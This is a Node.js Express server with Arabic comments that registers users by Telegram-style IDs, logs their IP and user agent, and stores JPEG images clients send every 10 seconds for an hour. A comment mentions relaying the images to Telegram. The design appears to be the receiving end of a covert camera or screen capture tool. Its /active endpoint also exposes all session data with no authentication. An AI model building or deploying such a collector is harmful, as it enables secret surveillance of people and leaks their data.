const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// مجلد التخزين
const SCREENSHOTS_DIR = path.join(__dirname, 'screenshots');
if (!fs.existsSync(SCREENSHOTS_DIR)) {
    fs.mkdirSync(SCREENSHOTS_DIR, { recursive: true });
}

// تخزين الجلسات النشطة
let activeSessions = {};

// API لتسجيل المستخدم
app.post('/register', (req, res) => {
    try {
        const { user_id, username, first_name, user_agent } = req.body;
        
        activeSessions[user_id] = {
            username: username || 'مجهول',
            first_name: first_name || 'مستخدم',
            start_time: new Date().toISOString(),
            user_agent: user_agent || 'غير معروف',
            ip: req.ip,
            screenshot_count: 0
        };
        
        console.log(`✅ جلسة جديدة: ${user_id} - ${first_name}`);
        
        res.json({
            status: 'success',
            message: 'تم التسجيل بنجاح',
            interval: 10000, // 10 ثواني
            duration: 3600000 // ساعة
        });
        
    } catch (error) {
        console.error('خطأ في التسجيل:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// API لاستقبال اللقطات
app.post('/capture', (req, res) => {
    try {
        const { user_id, image, count } = req.body;
        
        if (!user_id || !image) {
            return res.status(400).json({ status: 'error', message: 'بيانات ناقصة' });
        }
        
        // تحديث عداد الجلسة
        if (activeSessions[user_id]) {
            activeSessions[user_id].screenshot_count = count;
            activeSessions[user_id].last_capture = new Date().toISOString();
        }
        
        // حفظ الصورة
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, '');
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `${user_id}_${timestamp}_${count}.jpg`;
        const filepath = path.join(SCREENSHOTS_DIR, filename);
        
        fs.writeFileSync(filepath, base64Data, 'base64');
        
        console.log(`📸 لقطة جديدة: ${filename}`);
        
        // هنا يمكنك إضافة كود لإرسال الصورة لـ Telegram
        // عبر webhook أو API
        
        res.json({ status: 'success', message: 'تم استلام اللقطة' });
        
    } catch (error) {
        console.error('خطأ في استقبال اللقطة:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// API لعرض الجلسات النشطة
app.get('/active', (req, res) => {
    res.json({
        status: 'success',
        count: Object.keys(activeSessions).length,
        sessions: activeSessions
    });
});

// API لإيقاف جلسة
app.post('/stop', (req, res) => {
    try {
        const { user_id } = req.body;
        
        if (activeSessions[user_id]) {
            delete activeSessions[user_id];
            console.log(`⏹️ تم إيقاف جلسة: ${user_id}`);
        }
        
        res.json({ status: 'success', message: 'تم إيقاف الجلسة' });
        
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على منفذ ${PORT}`);
    console.log(`📁 مجلد اللقطات: ${SCREENSHOTS_DIR}`);
});